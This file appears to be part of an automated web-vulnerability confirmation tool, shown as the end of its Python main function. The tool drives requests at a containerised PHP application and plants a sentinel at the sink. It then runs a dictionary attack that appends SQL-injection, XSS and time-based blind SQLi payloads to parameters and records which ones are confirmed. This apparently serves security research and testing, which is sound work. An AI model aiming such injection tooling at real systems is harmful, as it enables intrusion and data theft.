    import time
    _deadline = (time.perf_counter() + args.wallclock_cap) if getattr(args, "wallclock_cap", 0) else 0
    _single = len(entry_candidates) <= 1

    if _method_round in ("GET", "POST"):
        _method_rounds = [_method_round]
    else:
        _method_rounds = ["GET", "POST"]

    def _cand_inf(_c) -> bool:
        _d = _c.get("speculative_distance")
        try:
            return _d is None or math.isinf(float(_d))
        except (TypeError, ValueError):
            return False
    _any_finite = any(not _cand_inf(_c) for _c in entry_candidates)

    rr = None
    _eu = None
    entry_url = None
    _confirmed_inloop = False
    _best_rr = None; _best_eu = None; _best_fg = None
    for _round_i, _round_m in enumerate(_method_rounds):
        _fg = "1" if _round_m == "GET" else "0"
        os.environ["VIPER_FORCE_GET"] = _fg
        if len(_method_rounds) > 1:
            print(f"[m3] ════ method round {_round_i+1}/{len(_method_rounds)}: "
                  f"{_round_m} (VIPER_FORCE_GET={_fg}) ════")
        for _k, _cand in enumerate(entry_candidates):
            _cout = out if _single else (out / f"entry_{_k}")
            if not _single:
                _cout.mkdir(parents=True, exist_ok=True)
            _eu = _cand.get("entry_url") or pipeline["entry_url"]
            if _any_finite and _cand_inf(_cand):
                print(f"[m3]   skip candidate {_eu} "
                      f"(spec_dist=∞ — unreachable, trying next)")
                continue
            if _cand.get("constraints"):
                pipeline["constraints"] = _cand["constraints"]
                pipeline["entry_url"] = _eu
                _ifc = len(_cand["constraints"].get("if_constraints", []))
                print(f"[m3]   using candidate-specific constraints "
                      f"({_ifc} if-constraint(s))")
            print(f"[m3] === candidate {_k+1}/{len(entry_candidates)}: {_eu} "
                  f"(spec_dist={_cand.get('speculative_distance')}) ===")
            rr = _reach_from_entry(_eu, pipeline, args, sink_file, sink_line,
                                   _resolved_headers, _cout, max_iters=args.max_iters,
                                   deadline_ts=_deadline, drop_cookies=_drop_cookies,
                                   bootstrap_relogin=_bootstrap_relogin)
            _trig = rr.get("reach_trigger")
            if _trig and _trig.get("triggered"):
                entry_url = _eu; _confirmed_inloop = True
                _best_rr = rr; _best_eu = _eu; _best_fg = _fg
                break
            if rr["reached_sink"] or rr["reach_blocked_verdict"] is not None:
                entry_url = _eu
                if _best_rr is None or (rr["reached_sink"] and not _best_rr["reached_sink"]):
                    _best_rr = rr; _best_eu = _eu; _best_fg = _fg
                break
            if _deadline and time.perf_counter() >= _deadline:
                entry_url = _eu
                if _best_rr is None:
                    _best_rr = rr; _best_eu = _eu; _best_fg = _fg
                break
        if _confirmed_inloop:
            break
        if _deadline and time.perf_counter() >= _deadline:
            break
    if _best_rr is not None:
        rr = _best_rr; entry_url = _best_eu
        os.environ["VIPER_FORCE_GET"] = _best_fg
    elif entry_url is None:
        entry_url = _eu

    result = rr["result"]; cur_params = rr["cur_params"]; cur_body = rr["cur_body"]
    discovered_sources = rr["discovered_sources"]; iter_index = rr["iter_index"]
    reach_blocked_verdict = rr["reach_blocked_verdict"]; history = rr["history"]
    reach_unreachable = rr.get("reach_unreachable")
    reach_trigger = rr.get("reach_trigger")

    metrics_collector.add_time("phase_a/total",
        __import__("time").perf_counter() - _phase_a_t0)

    _predator_confirmed = bool(reach_trigger and reach_trigger.get("triggered"))
    if _predator_confirmed:
        from urllib.parse import urlencode as _ue
        _rt_param = reach_trigger["param"]; _rt_payload = reach_trigger["payload"]
        _mal = dict(cur_params)
        _mal[_rt_param] = str(_mal.get(_rt_param, "")) + _rt_payload
        _mal_body = _ue({k: str(v) for k, v in _mal.items()})
        _vt_upper = (args.vuln_type or "sqli").upper()
        print(f"\n★★★ {_vt_upper} CONFIRMED in-loop (predator oracle) "
              f"— param={_rt_param!r}  payload={_rt_payload!r}")
        print(f"     reason: {reach_trigger.get('reason')}")
        (out / "final_trigger.json").write_text(
            json.dumps({
                "verdict": "CONFIRMED",
                "oracle": "predator",
                "param": _rt_param,
                "payload": _rt_payload,
                "mutate_mode": "append",
                "baseline_body": cur_body,
                "mal_body": _mal_body,
                "entry_url": entry_url,
                "headers": _resolved_headers,
                "trigger_iter": reach_trigger.get("iter_index", iter_index),
                "tokens": reach_trigger.get("tokens", []),
                "reason": reach_trigger.get("reason"),
                "signal_channel": reach_trigger.get("signal_channel"),
            }, indent=2, ensure_ascii=False)
        )
    _phase_b_t0 = __import__("time").perf_counter()
    _probes_jsonl = out / "phase_b_probes.jsonl"
    if result.get("reached_sink") and not _predator_confirmed:
        mutables = _identify_mutable_params(
            pipeline, cur_params,
            sink_file=sink_file, sink_line=sink_line,
            working_dir=args.working_dir,
        )
        if discovered_sources:
            _disc = [k for k in discovered_sources if k not in mutables]
            if _disc:
                mutables = list(mutables) + _disc
                print(f"  ⊕ + {len(_disc)} discovered injection target(s): {_disc}")
        _inj = ((pipeline.get("constraints") or {}).get("injection_param_schema")
                or {}).get("inject_param")
        if _inj:
            mutables = [_inj] + [m for m in mutables if m != _inj]
            print(f"  ★ prioritising schema inject_param: {_inj}")
        print(f"\n══════ Phase B: Differential-oracle dict attack ══════")
        print(f"  base PoC: {cur_body}")
        print(f"  mutable params (injection_chain + discovered): {mutables}")
        _phase_b_payloads, _xss_sentinel = _select_payloads(args.vuln_type)
        if os.environ.get("VIPER_PHASEB_SKIP_INBAND") == "1":
            print("  [TEST] VIPER_PHASEB_SKIP_INBAND=1 — skipping inband payloads, jumping to time-based fallback")
            _phase_b_payloads = []
        _vt_note = (f"  vuln_type: {args.vuln_type}  payloads: "
                    f"{len(_phase_b_payloads)}")
        if _xss_sentinel:
            _vt_note += f"  xss_sentinel: {_xss_sentinel}"
        print(_vt_note)
        if not mutables:
            print("  no mutable params identified; skipping dict attack")
        else:
            nonce_params = _nonce_rotate_mutables(
                cur_params, mutables,
                if_constraints=pipeline.get("constraints", {}).get("if_constraints", []) or [],
            )
            frozen = [k for k in mutables if k in cur_params and cur_params[k] == nonce_params.get(k)]
            print(f"  nonce-rotated baseline params: {nonce_params}"
                  + (f"  (frozen STRONG-constrained: {frozen})" if frozen else ""))
            container_sink = _container_path_for(
                sink_file, pipeline, container_root=args.container_root)
            print(f"  patching sentinel into {Path(sink_file).name}:{sink_line - 0} "
                  f"(container: {container_sink})")
            with SentinelInjector(sink_file, sink_line) as sent:
                _docker_cp_in(args.container, sink_file, container_sink)
                print(f"  sentinel uuid: {sent.uuid}")

                _ps = pipeline.get("constraints", {}).get("param_sources", {}) or {}
                _b_get  = {k: v for k, v in nonce_params.items() if (_ps.get(k) == "GET" or (_ps.get(k) == "REQUEST" and os.environ.get("VIPER_FORCE_GET") == "1"))}
                _b_post = {k: v for k, v in nonce_params.items() if not (_ps.get(k) == "GET" or (_ps.get(k) == "REQUEST" and os.environ.get("VIPER_FORCE_GET") == "1"))}
                baseline_body = _php_urlencode(_b_post)
                baseline_query = _php_urlencode(_b_get)
                baseline_method = "GET" if (_b_get and not _b_post) else "POST"
                token_hdr = _resolved_headers
                R_safe = do.observe(
                    label="safe", container=args.container,
                    entry_url=entry_url, body=baseline_body,
                    extra_headers=token_hdr, sentinel_uuid=sent.uuid,
                    http_method=baseline_method, get_query=baseline_query,
                )
                print(f"  R_safe: status={R_safe.http_status}, "
                      f"body_len={R_safe.body_len}, recv={R_safe.recv_size}B, "
                      f"sentinel_seen={R_safe.sentinel_seen}")
                if not R_safe.sentinel_seen:
                    print("  ⚠ baseline did not reach sink (sentinel missing)"
                          " — retrying once without nonce (Fallback D)")
                    _b_get_nn  = {k: v for k, v in cur_params.items() if (_ps.get(k) == "GET" or (_ps.get(k) == "REQUEST" and os.environ.get("VIPER_FORCE_GET") == "1"))}
                    _b_post_nn = {k: v for k, v in cur_params.items() if not (_ps.get(k) == "GET" or (_ps.get(k) == "REQUEST" and os.environ.get("VIPER_FORCE_GET") == "1"))}
                    baseline_body_nn  = _php_urlencode(_b_post_nn)
                    baseline_query_nn = _php_urlencode(_b_get_nn)
                    baseline_method_nn = "GET" if (_b_get_nn and not _b_post_nn) else "POST"
                    R_safe = do.observe(
                        label="safe_nn", container=args.container,
                        entry_url=entry_url, body=baseline_body_nn,
                        extra_headers=token_hdr, sentinel_uuid=sent.uuid,
                        http_method=baseline_method_nn,
                        get_query=baseline_query_nn,
                    )
                    print(f"  R_safe (no-nonce retry): status={R_safe.http_status}, "
                          f"body_len={R_safe.body_len}, recv={R_safe.recv_size}B, "
                          f"sentinel_seen={R_safe.sentinel_seen}")
                    if not R_safe.sentinel_seen:
                        print("  ⚠ even no-nonce baseline missed sink — abort")
                    else:
                        nonce_params = cur_params
                        baseline_body  = baseline_body_nn
                        baseline_query = baseline_query_nn
                        baseline_method = baseline_method_nn
                        print("  ⚠ Fallback D engaged — dict attack uses original PoC."
                              " Stateful-gate FP possible; sentinel reach confirmed.")
                        for param in mutables:
                            for payload in _phase_b_payloads:
                                iter_index += 1
                                _probe_t0 = __import__("time").perf_counter()
                                verdict, R_mal = do.probe(
                                    container=args.container, entry_url=entry_url,
                                    baseline_observation=R_safe,
                                    baseline_params=nonce_params,
                                    param=param, payload=payload,
                                    sentinel_uuid=sent.uuid,
                                    extra_headers=token_hdr, mutate_mode="append",
                                    http_method=baseline_method,
                                    param_sources=_ps,
                                )
                                if _xss_sentinel:
                                    _apply_xss_override(
                                        verdict, R_mal.response_body, _xss_sentinel)
                                _apply_crash_override(verdict, R_mal, args.vuln_type)
                                _probe_wall = __import__("time").perf_counter() - _probe_t0
                                metrics_collector.add_time("phase_b/probe_total_sec", _probe_wall)
                                metrics_collector.inc_count("phase_b/probes")
                                with open(_probes_jsonl, "a", encoding="utf-8") as _pf:
                                    _pf.write(json.dumps({
                                        "iter_index": iter_index,
                                        "param": param, "payload": payload,
                                        "verdict": verdict.verdict,
                                        "elapsed_sec": round(_probe_wall, 3),
                                        "baseline_mode": "fallback_d",
                                    }, ensure_ascii=False) + "\n")
                                print(f"  iter {iter_index}: param={param!r:<12} "
                                      f"payload={payload!r:<35} verdict={verdict.verdict}")
                                if verdict.verdict == "CONFIRMED":
                                    break
                            else:
                                continue
                            break
                else:
                    for param in mutables:
                        crashed = False
                        for payload in _phase_b_payloads:
                            iter_index += 1
                            _probe_t0 = __import__("time").perf_counter()
                            verdict, R_mal = do.probe(
                                container=args.container, entry_url=entry_url,
                                baseline_observation=R_safe,
                                baseline_params=nonce_params,
                                param=param, payload=payload,
                                sentinel_uuid=sent.uuid,
                                extra_headers=token_hdr, mutate_mode="append",
                                http_method=baseline_method,
                                param_sources=_ps,
                            )
                            if _xss_sentinel:
                                _apply_xss_override(
                                    verdict, R_mal.response_body, _xss_sentinel)
                            _apply_crash_override(verdict, R_mal, args.vuln_type)
                            _probe_wall = __import__("time").perf_counter() - _probe_t0
                            metrics_collector.add_time("phase_b/probe_total_sec", _probe_wall)
                            metrics_collector.inc_count("phase_b/probes")
                            with open(_probes_jsonl, "a", encoding="utf-8") as _pf:
                                _pf.write(json.dumps({
                                    "iter_index": iter_index,
                                    "param": param, "payload": payload,
                                    "verdict": verdict.verdict,
                                    "elapsed_sec": round(_probe_wall, 3),
                                    "baseline_mode": "nonce",
                                }, ensure_ascii=False) + "\n")
                            print(f"  iter {iter_index}: param={param!r:<12} "
                                  f"payload={payload!r:<32} "
                                  f"→ {verdict.verdict}")
                            print(f"    {verdict.reason}")
                            from urllib.parse import urlencode as _ue
                            mal_params = dict(nonce_params)
                            mal_params[param] = str(mal_params.get(param, "")) + payload
                            mal_body = _ue({k: str(v) for k, v in mal_params.items()})
                            v_dict = verdict.to_dict()
                            v_dict["trigger"] = {
                                "iter_index": iter_index,
                                "param": param,
                                "payload": payload,
                                "mutate_mode": "append",
                                "baseline_body": baseline_body,
                                "baseline_query": baseline_query,
                                "mal_body": mal_body,
                                "entry_url": entry_url,
                                "headers": token_hdr,
                            }
                            (out / f"iter_{iter_index}.verdict.json").write_text(
                                json.dumps(v_dict, indent=2, ensure_ascii=False)
                            )
                            if verdict.verdict == "CONFIRMED":
                                _vt_upper = (args.vuln_type or "sqli").upper()
                                print(f"\n★★★ {_vt_upper} CONFIRMED "
                                      f"— param={param!r}  payload={payload!r}")
                                print(f"     reason: {verdict.reason}")
                                if verdict.differences:
                                    print(f"     dimensions: {list(verdict.differences)}")
                                    print(f"     R_safe recv={R_safe.recv_size}B "
                                          f"vs R_mal recv={R_mal.recv_size}B")
                                (out / "final_trigger.json").write_text(
                                    json.dumps({
                                        "verdict": "CONFIRMED",
                                        "param": param,
                                        "payload": payload,
                                        "mutate_mode": "append",
                                        "baseline_body": baseline_body,
                                        "baseline_query": baseline_query,
                                        "mal_body": mal_body,
                                        "entry_url": entry_url,
                                        "headers": token_hdr,
                                        "trigger_iter": iter_index,
                                        "differences": verdict.differences,
                                    }, indent=2, ensure_ascii=False)
                                )
                                crashed = True
                                break
                        if crashed:
                            break
                    if not crashed and args.vuln_type == "sqli":
                        print(f"\n  ─ inband exhausted; trying time-based blind fallback "
                              f"({len(_SQLI_TIME_PAYLOADS)} payloads × {len(mutables)} params) ─")
                        for param in mutables:
                            for payload in _SQLI_TIME_PAYLOADS:
                                iter_index += 1
                                _probe_t0 = __import__("time").perf_counter()
                                verdict, R_mal = do.probe(
                                    container=args.container, entry_url=entry_url,
                                    baseline_observation=R_safe,
                                    baseline_params=nonce_params,
                                    param=param, payload=payload,
                                    sentinel_uuid=sent.uuid,
                                    extra_headers=token_hdr, mutate_mode="append",
                                    http_method=baseline_method,
                                    param_sources=_ps,
                                )
                                _probe_wall = __import__("time").perf_counter() - _probe_t0
                                metrics_collector.add_time("phase_b/probe_total_sec", _probe_wall)
                                metrics_collector.inc_count("phase_b/probes")
                                delta_ms = R_mal.elapsed_ms - R_safe.elapsed_ms
                                time_ok = do.time_channel_confirmed(R_safe, R_mal)
                                print(f"  iter {iter_index}: param={param!r:<12} "
                                      f"payload={payload!r:<48} "
                                      f"Δt={delta_ms}ms → "
                                      f"{'CONFIRMED' if time_ok else verdict.verdict}")
                                if not time_ok:
                                    continue
                                verdict.verdict = "CONFIRMED"
                                verdict.reason = (
                                    f"time channel: mal {R_mal.elapsed_ms}ms vs "
                                    f"safe {R_safe.elapsed_ms}ms (Δ={delta_ms}ms)"
                                )
                                verdict.differences["time_channel_ms"] = {
                                    "safe_ms": R_safe.elapsed_ms,
                                    "mal_ms": R_mal.elapsed_ms,
                                    "delta_ms": delta_ms,
                                    "threshold_ms": 1500,
                                }
                                from urllib.parse import urlencode as _ue
                                mal_params = dict(nonce_params)
                                mal_params[param] = str(mal_params.get(param, "")) + payload
                                mal_body = _ue({k: str(v) for k, v in mal_params.items()})
                                v_dict = verdict.to_dict()
                                v_dict["trigger"] = {
                                    "iter_index": iter_index,
                                    "param": param,
                                    "payload": payload,
                                    "mutate_mode": "append",
                                    "baseline_body": baseline_body,
                                    "baseline_query": baseline_query,
                                    "mal_body": mal_body,
                                    "entry_url": entry_url,
                                    "headers": token_hdr,
                                    "channel": "time_blind",
                                }
                                (out / f"iter_{iter_index}.verdict.json").write_text(
                                    json.dumps(v_dict, indent=2, ensure_ascii=False)
                                )
                                print(f"\n★★★ SQLI CONFIRMED via TIME CHANNEL "
                                      f"— param={param!r}  payload={payload!r}")
                                print(f"     {verdict.reason}")
                                (out / "final_trigger.json").write_text(
                                    json.dumps({
                                        "verdict": "CONFIRMED",
                                        "param": param,
                                        "payload": payload,
                                        "mutate_mode": "append",
                                        "baseline_body": baseline_body,
                                        "baseline_query": baseline_query,
                                        "mal_body": mal_body,
                                        "entry_url": entry_url,
                                        "headers": token_hdr,
                                        "trigger_iter": iter_index,
                                        "channel": "time_blind",
                                        "differences": verdict.differences,
                                    }, indent=2, ensure_ascii=False)
                                )
                                crashed = True
                                break
                            if crashed:
                                break
                    if not crashed:
                        print(f"\n  ✗ dict attack exhausted "
                              f"({len(mutables) * len(_phase_b_payloads)} combos) "
                              f"without confirmed differential")
            _docker_cp_in(args.container, sink_file, container_sink)

    metrics_collector.add_time("phase_b/total",
        __import__("time").perf_counter() - _phase_b_t0)

    (out / "run_history.json").write_text(
        json.dumps(history.to_dict(), indent=2, ensure_ascii=False)
    )
    final_trigger_path = out / "final_trigger.json"
    if not final_trigger_path.exists():
        if reach_blocked_verdict is not None:
            verdict_label = "REACH_BLOCKED_STATE"
        elif result and result.get("reached_sink"):
            verdict_label = "REACH_NOT_CONFIRMED"
        elif reach_unreachable is not None:
            verdict_label = "REACH_UNREACHABLE"
        else:
            verdict_label = "REACH_FAIL"
        _ft = {
            "verdict": verdict_label,
            "reached_sink": bool(result and result.get("reached_sink")),
            "last_baseline_body": cur_body if 'cur_body' in dir() else "",
            "entry_url": entry_url,
            "headers": _resolved_headers,
            "max_iters_used": iter_index,
        }
        if reach_blocked_verdict is not None:
            _ft["state_precondition"] = reach_blocked_verdict
        if reach_unreachable is not None:
            _ft["unreachable"] = reach_unreachable
        final_trigger_path.write_text(json.dumps(_ft, indent=2, ensure_ascii=False))

    metrics_collector.dump(out / "timings.json")

    print(f"\ndistance progress: {history.distance_progress}")
    print(f"unique blocker locs: {len(history.unique_blocker_locations)}")
    print(f"run history: {out / 'run_history.json'}")
    print(f"final trigger: {final_trigger_path}")
    print(f"timings:       {out / 'timings.json'}")


if __name__ == "__main__":
    main()
